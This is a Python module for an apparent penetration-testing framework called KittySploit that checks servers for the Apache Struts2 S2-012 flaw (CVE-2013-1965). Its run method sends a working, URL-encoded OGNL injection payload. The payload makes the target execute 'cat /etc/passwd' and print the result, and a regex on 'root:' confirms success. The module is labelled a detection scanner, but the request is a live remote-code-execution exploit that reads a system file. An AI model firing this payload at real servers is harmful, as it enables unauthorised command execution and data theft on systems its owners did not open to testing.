#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Apache Struts Showcase App 2."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Apache Struts2 S2-012 RCE Detection',
        'description': 'Apache Struts Showcase App 2.0.0 through 2.3.13, as used in Struts 2 before 2.3.14.3, allows remote attackers to execute arbitrary OGNL code via a crafted parameter name that is not properly handled when invoking a redirect.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve', 'cve2013', 'apache', 'rce', 'struts', 'ognl', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'http://struts.apache.org/development/2.x/docs/s2-012.html',
            'https://nvd.nist.gov/vuln/detail/CVE-2013-1965',
            'https://bugzilla.redhat.com/show_bug.cgi?id=967655',
            'https://github.com/CrackerCat/myhktools',
            'https://github.com/GhostTroops/myhktools',
        ],
        'cve': 'CVE-2013-1965',
    }

    def run(self):
        path = '/user.action'
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Content-Type': 'application/x-www-form-urlencoded'}, data='name=%25%7B%23a%3D%28new+java.lang.ProcessBuilder%28new+java.lang.String%5B%5D%7B%22cat%22%2C+%22%2Fetc%2Fpasswd%22%7D%29%29.redirectErrorStream%28true%29.start%28%29%2C%23b%3D%23a.getInputStream%28%29%2C%23c%3Dnew+java.io.InputStreamReader%28%23b%29%2C%23d%3Dnew+java.io.BufferedReader%28%23c%29%2C%23e%3Dnew+char%5B50000%5D%2C%23d.read%28%23e%29%2C%23f%3D%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29%2C%23f.getWriter%28%29.println%28new+java.lang.String%28%23e%29%29%2C%23f.getWriter%28%29.flush%28%29%2C%23f.getWriter%28%29.close%28%29%7D\n')
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_regexes = ('root:.*:0:0:',)
        if any(re.search(rx, body) for rx in body_regexes):
            self.set_info(
                severity='critical',
                reason='Apache Struts2 S2-012 RCE detected',
                path=path,
            )
            return True
        return False

